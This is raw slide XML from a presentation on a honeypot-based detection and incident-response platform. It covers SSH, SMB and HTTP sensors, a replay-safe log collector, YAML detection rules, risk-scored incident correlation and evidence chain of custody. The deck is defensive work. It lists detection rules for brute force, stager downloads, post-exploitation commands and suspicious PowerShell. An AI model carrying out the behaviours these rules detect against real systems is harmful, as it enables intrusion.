            <a:ext cx="1700784" cy="2487168"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5376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99339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05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59" y="1956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Picture 42" descr="link__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1432" y="2075688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229600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Correlate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816352"/>
            <a:ext cx="133502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Detections sharing a source IP roll into an incident and a session.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47504" y="3048609"/>
            <a:ext cx="64007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Isosceles Triangle 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="9784080" y="3003803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875519" y="1810512"/>
            <a:ext cx="1700784" cy="2487168"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5376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76688" y="199339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899647" y="1956816"/>
            <a:ext cx="475488" cy="475488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1" name="Picture 50" descr="file-check__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8519" y="2075688"/>
            <a:ext cx="237744" cy="2377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0076688" y="248716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Explain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76688" y="2816352"/>
            <a:ext cx="1335024" cy="12252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Risk is broken into components; the timeline reconstructs the attack.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" y="4535424"/>
            <a:ext cx="10911535" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9090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2688" y="470001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THE PROPERTY THAT MAKES IT SAFE TO REPLAY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" y="4937760"/>
            <a:ext cx="10332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Cursors commit in the same transaction as the events. If the process dies mid-cycle the transaction rolls back, the same bytes are re-read, and the content-hash primary key absorbs the repeat. Committing cursors separately would risk the opposite failure — advancing past events that were never stored.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76072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mbria"/>
              </a:rPr>
              <a:t>Idempotent end to end: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>re-processing the same events creates nothing new.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08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 animBg="1"/>
      <p:bldP spid="11" grpId="0"/>
      <p:bldP spid="12" grpId="0"/>
      <p:bldP spid="13" grpId="0"/>
      <p:bldP spid="14" grpId="0" animBg="1"/>
      <p:bldP spid="15" grpId="0" animBg="1"/>
      <p:bldP spid="16" grpId="0" animBg="1"/>
      <p:bldP spid="17" grpId="0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/>
      <p:bldP spid="26" grpId="0" animBg="1"/>
      <p:bldP spid="27" grpId="0"/>
      <p:bldP spid="28" grpId="0"/>
      <p:bldP spid="29" grpId="0"/>
      <p:bldP spid="30" grpId="0" animBg="1"/>
      <p:bldP spid="31" grpId="0" animBg="1"/>
      <p:bldP spid="32" grpId="0" animBg="1"/>
      <p:bldP spid="33" grpId="0"/>
      <p:bldP spid="34" grpId="0" animBg="1"/>
      <p:bldP spid="35" grpId="0"/>
      <p:bldP spid="36" grpId="0"/>
      <p:bldP spid="37" grpId="0"/>
      <p:bldP spid="38" grpId="0" animBg="1"/>
      <p:bldP spid="39" grpId="0" animBg="1"/>
      <p:bldP spid="40" grpId="0" animBg="1"/>
      <p:bldP spid="41" grpId="0"/>
      <p:bldP spid="42" grpId="0" animBg="1"/>
      <p:bldP spid="43" grpId="0"/>
      <p:bldP spid="44" grpId="0"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0" animBg="1"/>
      <p:bldP spid="47" grpId="0" animBg="1"/>
      <p:bldP spid="48" grpId="0" animBg="1"/>
      <p:bldP spid="49" grpId="0"/>
      <p:bldP spid="50" grpId="0" animBg="1"/>
      <p:bldP spid="51" grpId="0"/>
      <p:bldP spid="52" grpId="0"/>
      <p:bldP spid="53" grpId="0"/>
      <p:bldP spid="54" grpId="0" animBg="1"/>
      <p:bldP spid="55" grpId="0"/>
      <p:bldP spid="56" grpId="0"/>
      <p:bldP spid="57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07 · DEEP DIVE · DECEPTION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Three sensors, three attack surfaces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3529584" cy="2944368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 310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965960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883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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>cowrie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3113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SSH · Telnet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50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listening on 22 · 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2779776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9546" y="302437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294436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Full shell emulation — the attacker gets a prompt</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Oval 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="939546" y="357301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349300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Every credential pair and every command recorded</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Oval 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="939546" y="412165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52144" y="404164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Downloads captured as files, not just URLs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5112" y="1755648"/>
            <a:ext cx="3529584" cy="2944368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 310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08576" y="1965960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1883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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>dionaea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223113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SMB · FTP · MSSQL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450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listening on 445 · 21 · 1433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1144" y="2779776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24578" y="302437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37176" y="294436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Malware-collecting protocol emulation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624578" y="357301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349300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Captures dropped binaries for analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Oval 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4624578" y="412165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7176" y="404164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Catches worm and scanner traffic SSH never sees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1755648"/>
            <a:ext cx="3529584" cy="2944368"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 310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93607" y="1965960"/>
            <a:ext cx="91440" cy="91440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88366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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>honeytrap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2231136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HTTP · generic TCP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5" y="2450592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listening on 80 · 8080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66175" y="2779776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09609" y="302437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22208" y="294436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Low-interaction catch-all for unclaimed ports</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Oval 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8309609" y="357301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22208" y="349300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Web exploitation and path-traversal attempts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Oval 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8309609" y="4121658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22208" y="4041648"/>
            <a:ext cx="2798064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Widens coverage without widening the attack surface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4864608"/>
            <a:ext cx="5376672" cy="1060704"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8620"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="45000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="EF4444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0292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EF4444"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>CONTAINMENT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24865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The sensors are meant to be attacked — that is the point. They sit on a Docker network with no route to the application network, and their logs cross into the platform as a read-only mount.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9632" y="4864608"/>
            <a:ext cx="5349240" cy="1060704"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8620"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="18181D">
              <a:alpha val="45000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="34D399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50292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34D399"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>REPRODUCIBILITY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73952" y="5248656"/>
            <a:ext cx="480974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A replay script regenerates the same telemetry offline, so detection work and the review demonstration never depend on somebody choosing to attack the honeypot that afternoon.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09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/>
      <p:bldP spid="34" grpId="0"/>
      <p:bldP spid="35" grpId="0"/>
      <p:bldP spid="36" grpId="0" animBg="1"/>
      <p:bldP spid="37" grpId="0" animBg="1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/>
      <p:bldP spid="46" grpId="0" animBg="1"/>
      <p:bldP spid="47" grpId="0"/>
      <p:bldP spid="48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08 · DEEP DIVE ·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The collector, and why it cannot lose an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92224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Kernel-driven, not polled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inotify wakes the collector the moment a sensor appends. Interval polling is only the fallback where inotify is unavailable.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39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Cursors, not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81527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Each sensor log carries a byte cursor. Restarting re-reads from the cursor, never from the beginning and never from “now”.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77056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Content hash as primary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23944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The normalised event's hash is its identity, so a re-read of the same bytes silently collapses instead of duplicating.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1947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Latency is measured, not assumed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66360"/>
            <a:ext cx="5120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Every published batch records sensor-write-to-publication time, surfaced at /api/v1/live/collector.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1755648"/>
            <a:ext cx="5276088" cy="3310128"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 276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ONE COLLECTOR CYCLE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Oval 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6597396" y="2345436"/>
            <a:ext cx="82296" cy="82296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33972" y="2468880"/>
            <a:ext cx="10972" cy="384048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23113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tail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240279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LocalDirectorySource.fetch_with_cursors</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Oval 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6597396" y="2894076"/>
            <a:ext cx="82296" cy="82296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33972" y="3017520"/>
            <a:ext cx="10972" cy="384048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277977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normalise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78892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three sensor formats → one schema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Oval 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6597396" y="3442715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33972" y="3566159"/>
            <a:ext cx="10972" cy="384048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3328415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persist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4464" y="3337559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NormalizedEvent + RawEvent rows</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Oval 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6597396" y="3991356"/>
            <a:ext cx="82296" cy="822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33972" y="4114800"/>
            <a:ext cx="10972" cy="384048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387705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publish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88620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event_bus → SSE → dashboard</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Oval 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6597396" y="4539996"/>
            <a:ext cx="82296" cy="82296"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/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39712" y="442569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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>save cursors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4434840"/>
            <a:ext cx="3017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same transaction as the events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4" y="5175504"/>
            <a:ext cx="5276088" cy="932688"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9803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47104" y="5340096"/>
            <a:ext cx="47548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The S3 path used in AWS mode shares this same normalisation module — one schema, two sources, no divergence between local and cloud deployments.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35838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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>Losing telemetry silently is the failure mode this design is built against.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10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 animBg="1"/>
      <p:bldP spid="18" grpId="0" animBg="1"/>
      <p:bldP spid="19" grpId="0"/>
      <p:bldP spid="20" grpId="0"/>
      <p:bldP spid="21" grpId="0" animBg="1"/>
      <p:bldP spid="22" grpId="0" animBg="1"/>
      <p:bldP spid="23" grpId="0"/>
      <p:bldP spid="24" grpId="0"/>
      <p:bldP spid="25" grpId="0" animBg="1"/>
      <p:bldP spid="26" grpId="0" animBg="1"/>
      <p:bldP spid="27" grpId="0"/>
      <p:bldP spid="28" grpId="0"/>
      <p:bldP spid="29" grpId="0" animBg="1"/>
      <p:bldP spid="30" grpId="0" animBg="1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09 · DEEP DIVE ·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Rules that carry their own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4754880" cy="3675887"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2487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114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A87C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>detections/st-auth-001.yml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31136"/>
            <a:ext cx="420624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id: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st-auth-001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2890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name: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SSH / Telnet brute force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severity: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9524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confidence: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0.8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2841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attack:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New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6158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  technique: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T1110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  tactic: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Credential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793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type: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61104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selection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New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94276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  authentication_result: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FAILURE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2744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timeframe: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10m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60620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group_by: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source_ip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93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threshold:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="950" b="0">
                <a:solidFill>
                  <a:srgbClr val="F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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792224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Declarative, versioned, mounted read-only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2039112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Rules are YAML files under backend/detections/ — reviewable in a diff, reloadable without a code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2834639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Threshold and sequence matching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0448" y="3081527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Count-within-a-window rules and ordered-behaviour rules, both grouped by an arbitrary field.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0448" y="3877056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Every detection states its reason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0448" y="4123944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Rows carry the matched events, a human-readable reason, a confidence value, severity and the ATT&amp;CK technique.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70448" y="4919472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Idempotent by construction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0448" y="5166360"/>
            <a:ext cx="5669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A dedupe_key plus a processing cursor in system_config mean a replay produces no phantom detections.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70448" y="4242816"/>
            <a:ext cx="5678424" cy="1207008"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 757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442569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SHIPPED RULE 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4681728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st-auth-001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05472" y="468172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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>brute force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468172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T1110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87967" y="4681728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st-cred-002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48672" y="468172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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>success after brute force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0815" y="468172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T1078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44768" y="493776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st-exec-003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4937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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>post-exploitation command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57616" y="493776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T1059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4937760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st-exec-004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48672" y="4937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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>stager download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0815" y="493776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T1105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5193792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st-exec-005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05472" y="51937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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>suspicious PowerShell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7616" y="519379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T1059.001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87967" y="5193792"/>
            <a:ext cx="1042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st-recon-006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48672" y="519379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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>port / service scan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0815" y="519379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ourier New"/>
              </a:rPr>
              <a:t>T1046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63270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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>A detection nobody can explain </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="E8A87C"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
              </a:rPr>
              <a:t>is an alert, not a finding.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11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10 · DEEP DIVE · CORRELATION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From scattered detections to one graded incident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Severity is computed, not asserted — and the arithmetic is stored alongside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12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73936"/>
            <a:ext cx="5212080" cy="4078224"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 224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568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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>INC-000142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5681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2A1B19">
              <a:alpha val="92000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="5A2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568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EF4444"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/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4663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source 185.***.***.42  ·  6 detections  ·  4 techniques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615184"/>
            <a:ext cx="466344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432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RISK BREAKDOWN — STORED WITH THE INCIDENT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4436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9EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>severity_component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4911" y="2994660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24911" y="2994660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05072" y="294436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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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94436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max severity rank × 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2841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9EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>detection_component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24911" y="3378708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24911" y="3378708"/>
            <a:ext cx="396240" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4545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05072" y="3328416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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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3328416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6 detections × 6, capped at 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1246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9EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>technique_component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24911" y="3762756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724911" y="3762756"/>
            <a:ext cx="330200" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4545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05072" y="3712464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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New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35424" y="371246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4 techniques × 5, capped at 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09651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9EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>event_component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24911" y="4146804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24911" y="4146804"/>
            <a:ext cx="188214" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4545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5072" y="4096512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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>11.4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409651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max event risk × 0.15, capped at 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4805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9EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>session_component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24911" y="4530852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24911" y="4530852"/>
            <a:ext cx="135382" cy="100584"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4545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05072" y="4480560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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>8.2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4480560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session events × 0.2, capped at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6460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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>malware_component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24911" y="4914900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05072" y="4864608"/>
            <a:ext cx="4206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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Courier New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35424" y="4864608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no linked sample analysis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" y="5175504"/>
            <a:ext cx="466344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358384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6E6B76"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>total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5266944"/>
            <a:ext cx="95097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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="D4634A"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>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35424" y="535838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capped at 100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72784" y="175564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9" name="Picture 48" descr="link_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865376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58000" y="1773936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Grouped by source, bounded by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2020824"/>
            <a:ext cx="46908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Activity from one source folds into an open incident for six hours; beyond that a new incident opens.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72784" y="276148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3" name="Picture 52" descr="clock__a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512" y="2871216"/>
            <a:ext cx="237744" cy="23774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6858000" y="2779776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Attack reconstruction timeline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0" y="3026664"/>
            <a:ext cx="46908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Detections, raw events and analyst actions merge into one ordered narrative of the intrusion.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72784" y="376732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7" name="Picture 56" descr="key__a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3877056"/>
            <a:ext cx="237744" cy="23774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58000" y="3785616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Linked IOCs and techniques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032504"/>
            <a:ext cx="46908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URLs, domains and file hashes extracted from the matched events, deduplicated by type and value.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72784" y="47731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1" name="Picture 60" descr="users__ac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4882896"/>
            <a:ext cx="237744" cy="23774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858000" y="4791456"/>
            <a:ext cx="46908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0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Analyst audit trail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0" y="5038344"/>
            <a:ext cx="46908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Every status change, note and evidence attachment is recorded against the incident, attributed and timestamped.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72784" y="5797296"/>
            <a:ext cx="5276088" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15151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28816" y="59436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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>The correlation cycle runs roughly every 20 seconds against a two-hour lookback window.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12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8" grpId="0"/>
      <p:bldP spid="29" grpId="0"/>
      <p:bldP spid="30" grpId="0"/>
      <p:bldP spid="31" grpId="0" animBg="1"/>
      <p:bldP spid="32" grpId="0" animBg="1"/>
      <p:bldP spid="33" grpId="0"/>
      <p:bldP spid="34" grpId="0"/>
      <p:bldP spid="35" grpId="0"/>
      <p:bldP spid="36" grpId="0" animBg="1"/>
      <p:bldP spid="37" grpId="0" animBg="1"/>
      <p:bldP spid="38" grpId="0"/>
      <p:bldP spid="39" grpId="0"/>
      <p:bldP spid="40" grpId="0"/>
      <p:bldP spid="41" grpId="0" animBg="1"/>
      <p:bldP spid="42" grpId="0"/>
      <p:bldP spid="43" grpId="0"/>
      <p:bldP spid="44" grpId="0" animBg="1"/>
      <p:bldP spid="45" grpId="0"/>
      <p:bldP spid="46" grpId="0"/>
      <p:bldP spid="47" grpId="0"/>
      <p:bldP spid="48" grpId="0" animBg="1"/>
      <p:bldP spid="49" grpId="0"/>
      <p:bldP spid="50" grpId="0"/>
      <p:bldP spid="51" grpId="0"/>
      <p:bldP spid="52" grpId="0" animBg="1"/>
      <p:bldP spid="53" grpId="0"/>
      <p:bldP spid="54" grpId="0"/>
      <p:bldP spid="55" grpId="0"/>
      <p:bldP spid="56" grpId="0" animBg="1"/>
      <p:bldP spid="57" grpId="0"/>
      <p:bldP spid="58" grpId="0"/>
      <p:bldP spid="59" grpId="0"/>
      <p:bldP spid="60" grpId="0" animBg="1"/>
      <p:bldP spid="61" grpId="0"/>
      <p:bldP spid="62" grpId="0"/>
      <p:bldP spid="63" grpId="0"/>
      <p:bldP spid="64" grpId="0" animBg="1"/>
      <p:bldP spid="65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11 · DEEP DIVE ·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Evidence you could hand to somebody else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5138928" cy="3035808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 301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CHAIN OF CUSTODY, PER ITEM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Oval 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950976" y="2313432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1" y="2212848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content_hash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896" y="2221991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SHA-256 of the evidence blob, computed on ingest</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Oval 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950976" y="2697479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1" y="2596896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immutable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2606039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true by default — items are appended, never edited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3081527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1" y="2980944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collected_by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2990087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authenticated analyst who attached it</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Oval 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950976" y="3465575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1" y="3364991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collected_at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3374135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UTC timestamp written at attachment</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Oval 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950976" y="3849624"/>
            <a:ext cx="73152" cy="73152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1" y="3749039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incident_id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3758183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incident the item belongs to</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Oval 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950976" y="4233672"/>
            <a:ext cx="73152" cy="7315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1" y="4133087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896" y="4142231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authenticated endpoint only — never a static path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572000"/>
            <a:ext cx="4590288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61104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An analyst can re-hash a stored item months later and prove it is the artefact that was collected — or prove that it is not.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1755648"/>
            <a:ext cx="5404104" cy="3035808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3012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WHERE DANGEROUS ARTEFACTS LIVE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19088" y="2249424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542531" y="2409444"/>
            <a:ext cx="82296" cy="8229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2249424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backend/quarantine/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41663" y="2249424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captured malware samples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2761488"/>
            <a:ext cx="4846320" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13636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42531" y="2921508"/>
            <a:ext cx="82296" cy="8229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48272" y="2761488"/>
            <a:ext cx="19202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backend/evidence/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1663" y="2761488"/>
            <a:ext cx="237744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incident evidence blobs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Oval 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6462522" y="3490722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3401568"/>
            <a:ext cx="46268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Never served by nginx and never committed to the repository.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Oval 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6462522" y="3947922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3858768"/>
            <a:ext cx="46268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Malware samples leave only through GET /evidence/{id}/sample, behind authentication.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Oval 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6462522" y="4405122"/>
            <a:ext cx="59436" cy="59436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4315968"/>
            <a:ext cx="462686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The isolation is covered by an automated test — test_malware_isolation.py.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4956048"/>
            <a:ext cx="10911535" cy="950976"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9615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2688" y="512064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TIMELINE RECONSTRUCTION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" y="5340096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19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>timeline_builder merges normalised events, detections, session commands and analyst activity into a single ordered account of the intrusion — the artefact an examiner actually reads, and the spine of the DFIR report.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13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/>
      <p:bldP spid="9" grpId="0" animBg="1"/>
      <p:bldP spid="10" grpId="0"/>
      <p:bldP spid="11" grpId="0"/>
      <p:bldP spid="12" grpId="0" animBg="1"/>
      <p:bldP spid="13" grpId="0"/>
      <p:bldP spid="14" grpId="0"/>
      <p:bldP spid="15" grpId="0" animBg="1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47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12 · DEEP DIVE ·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How the attacker worked — never who they were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92224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Temporal interaction graph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51023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Sessions, source addresses, commands and observed indicators become nodes and edges over a rolling 30-day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07791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Real graph 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79"/>
            <a:ext cx="51023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Centrality and connected components are computed with networkx — not estimated, and not hand-waved in the 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Style, not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70248"/>
            <a:ext cx="51023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Activity is classed as automated scanner, credential-stuffing bot or hands-on-keyboard from measured signals: timing, entropy, command variety.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38928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F0EDE8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Deliberately no attribution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85816"/>
            <a:ext cx="5102352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A19EA9"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>The platform never names an APT. Nothing a honeypot observes can support that claim, so the claim is not made.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7648" y="1755648"/>
            <a:ext cx="5221224" cy="3968496"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 230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1938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ATTACKER INTERACTION GRAPH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20214191">
            <a:off x="7279303" y="3094329"/>
            <a:ext cx="1351952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1385809">
            <a:off x="7279303" y="3624681"/>
            <a:ext cx="1351952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1039900">
            <a:off x="8568113" y="2719425"/>
            <a:ext cx="1352941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1091950">
            <a:off x="8541922" y="3048609"/>
            <a:ext cx="1405323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93946">
            <a:off x="8574724" y="3944721"/>
            <a:ext cx="1284854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1153840">
            <a:off x="9833995" y="4136745"/>
            <a:ext cx="832857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3209544"/>
